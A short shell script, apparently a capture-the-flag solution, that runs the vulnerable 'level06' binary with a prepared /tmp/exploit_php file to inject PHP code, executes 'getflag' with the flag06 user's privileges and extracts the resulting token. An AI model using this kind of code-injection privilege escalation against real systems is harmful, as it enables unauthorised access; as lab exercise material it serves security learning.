#!/bin/sh

# Run the `level06` binary with the `flag06` user privileges
# passing the `/tmp/exploit_php` file as argument to inject the PHP code
# allowing to run the `getflag` command
./level06 /tmp/exploit_php >/dev/null

# Extract the token from the `/tmp/getflag_as_flag06` file
grep -oE '[^ ]+$' /tmp/getflag_as_flag06 >/tmp/token

exit 0
